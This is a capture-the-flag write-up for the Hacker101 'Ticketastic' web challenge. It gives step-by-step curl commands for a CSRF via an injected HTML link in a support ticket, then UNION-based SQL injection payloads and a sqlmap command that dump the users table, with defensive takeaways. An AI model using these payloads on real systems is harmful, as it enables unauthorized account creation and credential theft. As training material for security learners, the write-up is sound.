# Ticketastic: Live Instance (Moderate)
 
**Difficulty:** Moderate  
**Category:** Web / CSRF / SQL Injection  
**Flags:** 2
---
## Overview
Ticketastic is a Python/MySQL ticketing system. The application lets users submit support tickets and admins view/reply to them. The live instance shares code with a publicly available demo instance. The challenge combines HTML injection leading to CSRF (Flag0) with a classic UNION-based SQL injection (Flag1).
**Server:** openresty/1.29.2.4, Python 2.7 Flask, MySQL (MariaDB 10.1.37)
The application exposes these endpoints:
| Endpoint | Purpose |
|----------|---------|
| `GET /` | Homepage with links to submit ticket and admin login |
| `GET /newTicket`, `POST /newTicket` | Submit a ticket (title + body) |
| `GET /login`, `POST /login` | Admin login form (username + password) |
| `GET /admin` | Admin dashboard — lists pending tickets, create users (auth required) |
| `GET /ticket?id=N` | View a specific ticket by ID (auth required) |
| `GET /newUser?username=X&password=Y&password2=Y` | Create a new user via GET request (no auth required!) |
---
## Reconnaissance
### Application Behavior
The homepage presents two links: "Submit a Ticket" and "Admin Login." Ticket submission is a simple HTML form (`title` + `body` fields, POST). The login form accepts `username` + `password`.
Key observations:
- **No sanitization on ticket body:** The ticket body accepts raw HTML and renders it unescaped when viewed by admins/bots.
- **Demo instance shares code:** The hint confirms the live instance runs the same code as the demo. The demo has `admin:admin` credentials and exposes a `/newUser` endpoint that creates users via **GET parameters** with no authentication.
- **Knowledgebase bot renders tickets:** The homepage text mentions: *"only the knowledgebase bot looks at the tickets submitted here."*
- **Login error differentiation:** Submitting `admin:admin` returns "Invalid **password**" (username exists), while a non-existent username returns "Invalid **username**" — user enumeration via error messages.
- **Ticket endpoint uses numeric IDs:** Ticket URLs are `/ticket?id=1`, suggesting a database-backed query.
- **Session cookie:** After login, a JWT-style cookie is set: `session_level7b=eyJ1c2VyIjoiaGFja2VkIn0...`
### Technology Stack
- **Reverse proxy:** openresty/1.29.2.4
- **Application:** Python 2.7 Flask (`main.py`)
- **Database:** MySQL (MariaDB 10.1.37)
- **Auth:** JWT-based session cookie
---
## Flag 0 — CSRF via HTML Injection
**Method:** Submit a ticket containing an HTML link to `/newUser`, which a bot/admin clicks, creating an attacker-controlled account
**Hints:** *"This level and the Ticketastic demo instance are running the same code"* / *"Take a look at addUser on the demo instance"* / *"What is missing?"* / *"Humans might read these tickets and interact with them"* / *"Links in tickets could be interesting"*
### The Vulnerability
The demo instance reveals that `/newUser` accepts GET parameters (`username`, `password`, `password2`) with **no authentication check** — anyone can create a user by visiting the URL. The live instance shares this code.
Meanwhile, the ticket submission form has **no sanitization** on the `body` field. HTML submitted in the body is rendered as-is when the ticket is viewed. Since a bot or admin periodically reviews submitted tickets, any HTML link or image in the ticket body will be followed.
### The Attack
**Step 1 — Submit a CSRF ticket:**
```bash
curl -s -X POST \
  'https://TARGET.ctf.hacker101.com/newTicket' \
  --data-urlencode 'title=Click me' \
  --data-urlencode 'body=<a href="http://localhost/newUser?username=hacked&password=hacked&password2=hacked">Click here</a>'
```
The bot reviewing tickets renders and follows the link, creating a user `hacked:hacked`.
**Step 2 — Login with the CSRF-created account:**
```bash
curl -s -i -c cookies.txt -X POST \
  'https://TARGET.ctf.hacker101.com/login' \
  -d 'username=hacked&password=hacked'
```
Response sets the session cookie and redirects to `/admin`.
**Step 3 — View pending tickets:**
```bash
curl -s -b cookies.txt \
  'https://TARGET.ctf.hacker101.com/admin'
```
The admin dashboard lists all tickets, including one titled **"Flag Won't Work"** (id=1).
**Step 4 — Read the flag ticket:**
```bash
curl -s -b cookies.txt \
  'https://TARGET.ctf.hacker101.com/ticket?id=1'
```
**Response:**
```html
<h1>Flag Won't Work</h1>
<pre>I got the flag ^FLAG^...$FLAG$ but the site rejects it.  Any thoughts?</pre>
<h2>Our Reply</h2>
<pre>Yeah, the correct flag is ^FLAG^<redacted>$FLAG$.  Let me know if you have any problems!</pre>
```
> **Flag 0:** `^FLAG^<redacted>$FLAG$`
### Alternative: SQL Injection
Flag 0 is also retrievable directly via SQL injection on the tickets table without needing CSRF:
```sql
id=1.1 UNION SELECT 1,body,reply FROM tickets WHERE id=1--
```
**Takeaway:** Always require authentication on user-creation endpoints. Never pass credentials via GET parameters (they appear in logs, referrer headers, and are bookmarkable). Sanitize user-submitted HTML — any content that will be rendered by another user is a potential CSRF or stored XSS vector.
---
## Flag 1 — SQL Injection on Ticket View
**Method:** UNION-based SQL injection on `/ticket?id=` to extract the admin password from the `users` table
**Hints:** *"How do others log into this instance?"* / *"The login form reveals more than it should"* / *"So does the ticket endpoint"*
### The Vulnerability
The `/ticket?id=` endpoint constructs SQL queries using Python string formatting (`%s`), not parameterized queries:
```python
cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])
```
The `id` parameter is inserted directly into the SQL string without sanitization, enabling full SQL injection.
### SQL Injection Walkthrough
All queries require a valid session cookie (obtained via Flag0's CSRF or any logged-in user).
**Step 1 — Confirm SQLi with boolean tests:**
```bash
# TRUE: returns ticket 1
curl -s -b cookies.txt 'https://TARGET.ctf.hacker101.com/ticket?id=1%20AND%201=1'
# FALSE: throws TypeError (no row returned)
curl -s -b cookies.txt 'https://TARGET.ctf.hacker101.com/ticket?id=1%20AND%201=2'
```
**Step 2 — Determine column count with UNION SELECT:**
```bash
curl -s -b cookies.txt 'https://TARGET.ctf.hacker101.com/ticket?id=1.1%20UNION%20SELECT%201,2,3--'
```
**Result:** 3 columns. Output positions:
- Column 1 → Ticket title (`<h1>`)
- Column 2 → Ticket body (`<pre>`)
- Column 3 → Reply (`<pre>` under "Our Reply")
**Step 3 — Identify database and tables:**
```bash
# Database version
curl -s -b cookies.txt 'https://TARGET.ctf.hacker101.com/ticket?id=1.1%20UNION%20SELECT%201,VERSION(),3--'
# → 10.1.37-MariaDB-0+deb9u1
# Enumerate tables
curl -s -b cookies.txt --get 'https://TARGET.ctf.hacker101.com/ticket' \
  --data-urlencode "id=1.1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--"
# → tickets,users
```
**Step 4 — Enumerate columns:**
```bash
curl -s -b cookies.txt --get 'https://TARGET.ctf.hacker101.com/ticket' \
  --data-urlencode "id=1.1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'--"
# → id,username,password
```
**Step 5 — Dump admin credentials:**
```bash
curl -s -b cookies.txt --get 'https://TARGET.ctf.hacker101.com/ticket' \
  --data-urlencode "id=1.1 UNION SELECT 1,CONCAT(username,':',password),3 FROM users LIMIT 1--"
```
**Response:**
```html
<h1>1</h1>
<pre>admin:^FLAG^<redacted>$FLAG$</pre>
<h2>Our Reply</h2>
<pre>3</pre>
```
> **Flag 1:** `^FLAG^<redacted>$FLAG$`
### Alternative: sqlmap Automation
```bash
sqlmap -u "https://TARGET.ctf.hacker101.com/ticket?id=1" \
  --cookie="session_level7b=<SESSION_COOKIE>" \
  -D level7 -T users --dump
```
**Takeaway:** Always use parameterized queries. Python string formatting (`%s`) in SQL queries is trivially exploitable with arbitrary SQL — the attacker only needs a single injectable parameter to dump the entire database. Error message differentiation ("Invalid username" vs "Invalid password") also leaks user existence.
---
## Complete Flag List
| Flag | Hash | Vulnerability | Technique |
|:----:|------|:-------------|-----------|
| 0 | `<redacted>` | HTML injection → CSRF | Submitted ticket with `<a href="/newUser?...">` → bot clicks → attacker logs in → reads ticket reply |
| 1 | `<redacted>` | SQL injection | UNION SELECT on `/ticket?id=` → extracted `admin` password from `users` table |
---
## Key Takeaways
1. **Authenticate user-creation endpoints.** The `/newUser` endpoint required no authentication — any GET request created an account. Never assume an endpoint is "hidden" just because no UI links to it.
2. **Never pass credentials in GET parameters.** The demo instance's `newUser?username=X&password=Y` pattern is a fundamental anti-pattern. GET parameters appear in access logs, proxy logs, referrer headers, and browser history.
3. **Sanitize user-submitted HTML.** The ticket body had zero sanitization, allowing arbitrary HTML injection. When content will be rendered by another user (bot or admin), treat it as a stored XSS/CSRF vector.
4. **Use parameterized queries.** Python's `'...' % request.args['id']` pattern is SQL injection in its simplest form. Always use parameterized queries: `cursor.execute('SELECT ... WHERE id=%s', (request.args['id'],))`.
5. **Don't leak user existence.** Differentiating "Invalid username" from "Invalid password" enables user enumeration. Return a generic "Invalid credentials" message instead.
6. **Same code, same bugs.** The hint explicitly confirms the live and demo instances share code. Always test against a demo/staging environment first — bugs discovered there often apply to production.
---
## References
- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [Hacker101 — SQL Injection (Video)](https://www.hacker101.com/sessions/sqli)
- [Hacker101 — Cross-Site Request Forgery (Video)](https://www.hacker101.com/sessions/csrf)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP — Cross-Site Request Forgery](https://owasp.org/www-community/attacks/csrf)
